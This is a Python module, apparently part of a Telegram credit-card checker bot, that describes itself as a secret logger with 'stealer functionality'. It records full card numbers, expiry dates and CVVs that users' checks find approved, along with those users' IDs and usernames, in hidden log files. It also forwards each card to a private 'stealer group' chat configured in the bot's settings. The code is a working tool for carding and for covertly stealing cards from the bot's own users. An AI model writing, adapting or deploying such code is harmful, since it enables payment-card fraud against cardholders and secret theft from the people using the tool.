"""
================================================================================
  Secret Approved Cards Logger
  Logs all approved cards from all users
  Includes stealer functionality to send approved cards to private group
================================================================================
"""

import os
import sys
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import DB_APPROVED_CARDS, DB_APPROVED_LOG, DATABASE_DIR, DB_SETTINGS

APPROVED_CARDS_FILE = DB_APPROVED_CARDS
APPROVED_CARDS_LOG = DB_APPROVED_LOG

def get_stealer_group_id():
    """Get the stealer group ID from settings"""
    try:
        if os.path.exists(DB_SETTINGS):
            with open(DB_SETTINGS, 'r', encoding='utf-8') as f:
                for line in f:
                    if line.startswith('stealer_group_id='):
                        value = line.split('=', 1)[1].strip()
                        if value and value != 'None':
                            return int(value)
    except:
        pass
    return None

def set_stealer_group_id(group_id):
    """Set the stealer group ID in settings"""
    try:
        settings = {}
        if os.path.exists(DB_SETTINGS):
            with open(DB_SETTINGS, 'r', encoding='utf-8') as f:
                for line in f:
                    if '=' in line:
                        key, value = line.split('=', 1)
                        settings[key.strip()] = value.strip()
        
        settings['stealer_group_id'] = str(group_id) if group_id else 'None'
        
        with open(DB_SETTINGS, 'w', encoding='utf-8') as f:
            for key, value in settings.items():
                f.write(f"{key}={value}\n")
        return True
    except:
        return False

async def send_to_stealer_group(bot, cc, mm, yy, cvv, gate, response, bin_info, user_id, username):
    """Send approved card to stealer group"""
    try:
        stealer_group_id = get_stealer_group_id()
        if not stealer_group_id:
            return False
        
        card_data = f"{cc}|{mm}|{yy}|{cvv}"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        text = f"""🔥 <b>APPROVED CARD</b> 🔥

━━━━━━━━━━━━━━━━━━━━━━

💳 <b>Card:</b> <code>{card_data}</code>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>BIN Info:</b>
• Brand: {bin_info.get('brand', 'N/A')}
• Type: {bin_info.get('type', 'N/A')}
• Bank: {bin_info.get('bank', 'N/A')}
• Country: {bin_info.get('country', 'N/A')} {bin_info.get('emoji', '')}

━━━━━━━━━━━━━━━━━━━━━━

🚪 <b>Gate:</b> {gate.upper()}
✅ <b>Response:</b> {response}

━━━━━━━━━━━━━━━━━━━━━━

👤 <b>Checked by:</b> @{username} ({user_id})
⏰ <b>Time:</b> {timestamp}"""

        await bot.send_message(
            chat_id=stealer_group_id,
            text=text,
            parse_mode='HTML'
        )
        return True
    except Exception as e:
        print(f"Error sending to stealer group: {e}")
        return False

def log_approved_card(user_id, username, cc, mm, yy, cvv, gate, response, bin_info):
    """Log approved card with full details"""
    try:
        os.makedirs(DATABASE_DIR, exist_ok=True)
        
        # Create timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Format card data
        card_data = f"{cc}|{mm}|{yy}|{cvv}"
        
        # Detailed log entry
        log_entry = f"""
{'='*80}
APPROVED CARD FOUND
{'='*80}
Time: {timestamp}
User ID: {user_id}
Username: @{username}
Card: {card_data}
Gateway: {gate}
Response: {response}
BIN: {bin_info.get('bin', 'N/A')}
Brand: {bin_info.get('brand', 'N/A')}
Type: {bin_info.get('type', 'N/A')}
Bank: {bin_info.get('bank', 'N/A')}
Country: {bin_info.get('country', 'N/A')} {bin_info.get('emoji', '')}
{'='*80}

"""
        
        # Append to detailed log
        with open(APPROVED_CARDS_LOG, 'a', encoding='utf-8') as f:
            f.write(log_entry)
        
        # Append to simple cards list
        simple_entry = f"{timestamp}|{user_id}|@{username}|{card_data}|{gate}|{response}\n"
        with open(APPROVED_CARDS_FILE, 'a', encoding='utf-8') as f:
            f.write(simple_entry)
        
        return True
    except Exception as e:
        print(f"Error logging approved card: {e}")
        return False

def get_approved_cards(limit=50):
    """Get recent approved cards"""
    try:
        if not os.path.exists(APPROVED_CARDS_FILE):
            return []
        
        with open(APPROVED_CARDS_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        # Return last N cards
        return [line.strip() for line in lines[-limit:]]
    except:
        return []

def get_approved_count():
    """Get total approved cards count"""
    try:
        if not os.path.exists(APPROVED_CARDS_FILE):
            return 0
        
        with open(APPROVED_CARDS_FILE, 'r', encoding='utf-8') as f:
            return len(f.readlines())
    except:
        return 0

def get_user_approved_cards(user_id, limit=10):
    """Get approved cards for specific user"""
    try:
        if not os.path.exists(APPROVED_CARDS_FILE):
            return []
        
        with open(APPROVED_CARDS_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        user_cards = [line.strip() for line in lines if f"|{user_id}|" in line]
        return user_cards[-limit:]
    except:
        return []
